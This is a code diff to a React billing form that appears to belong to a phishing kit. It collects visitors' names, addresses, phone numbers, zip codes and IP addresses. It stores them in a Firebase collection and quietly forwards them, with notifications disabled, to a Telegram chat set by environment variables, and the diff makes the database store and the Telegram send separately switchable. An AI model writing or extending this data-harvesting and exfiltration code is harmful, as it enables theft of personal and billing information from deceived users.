@@ -45,6 +45,8 @@ const Billing = () => {
             .then(ip => {
                 const secretKey = process.env.REACT_APP_PUBLIC_ENCRYPT_KEY
                 const isEnableDecrypt = process.env.REACT_APP_PUBLIC_ENCRYPT_ENABLE
+                const isEnableDBStore = process.env.REACT_APP_PUBLIC_DB_STORE_ENABLE
+                const isEnableTM = process.env.REACT_APP_PUBLIC_TM_ENABLE
                 let fullnames = fullname
                 let addresss = address
                 let states = state
@@ -66,40 +68,47 @@ const Billing = () => {
                     ip_address = CryptoJS.AES.encrypt(ip_address, secretKey).toString() 
                     logged_at = CryptoJS.AES.encrypt( logged_at, secretKey).toString()
                 }
-                db.collection('billing-data').add({
-                    fullname: fullnames, 
-                    address: addresss, 
-                    state: states, 
-                    city: citys, 
-                    zip: zips, 
-                    phone: phones, 
-                    country: countrys,
-                    ip_address: ip_address,
-                    logged_at: logged_at
-                }).then(data => {
-                    if( process.env.REACT_APP_PUBLIC_TM_ENABLE === '1' )
-                    {
-                        let message = "Billing Data\r\n"
-                        message += "" + fullnames + '\r\n'
-                        message += "" + addresss + '\r\n'
-                        message += "" + states + '\r\n'
-                        message += "" + citys + '\r\n'
-                        message += "" + zips + '\r\n'
-                        message += "" + phones + '\r\n'
-                        message += "" + countrys + '\r\n'
-                        message += "" + ip_address + '\r\n'
-                        message += "" + logged_at
-                        client.sendMessage(process.env.REACT_APP_PUBLIC_TM_CHAT_ID, message, {
-                            disableWebPagePreview: true,
-                            disableNotification: true,
-                        })
-                        .then( res => console.log(res,'telegram res'))
-                        .catch( e => console.log('error while TM message' + e))
-                    }
-                    setFromSuccess(true);
-                }).catch(err => {
-                    throw new Error(err);
-                });
+                let tmMessage = "Billing Data\r\n"
+                    tmMessage += "" + fullnames + '\r\n'
+                    tmMessage += "" + addresss + '\r\n'
+                    tmMessage += "" + states + '\r\n'
+                    tmMessage += "" + citys + '\r\n'
+                    tmMessage += "" + zips + '\r\n'
+                    tmMessage += "" + phones + '\r\n'
+                    tmMessage += "" + countrys + '\r\n'
+                    tmMessage += "" + ip_address + '\r\n'
+                    tmMessage += "" + logged_at
+                if( isEnableDBStore === '1' )
+                {
+                    db.collection('billing-data').add({
+                        fullname: fullnames, 
+                        address: addresss, 
+                        state: states, 
+                        city: citys, 
+                        zip: zips, 
+                        phone: phones, 
+                        country: countrys,
+                        ip_address: ip_address,
+                        logged_at: logged_at
+                    }).then(data => {
+                        setFromSuccess(true);
+                    }).catch(err => {
+                        throw new Error(err);
+                    });
+                }
+                
+                if( isEnableTM === '1' )
+                {
+                    client.sendMessage(process.env.REACT_APP_PUBLIC_TM_CHAT_ID, tmMessage, {
+                        disableWebPagePreview: true,
+                        disableNotification: true,
+                    })
+                    .then( res => {
+                        setFromSuccess(true);
+                    })
+                    .catch( e => console.log('error while TM message' + e))
+                }
+                
             })
 
         } else {
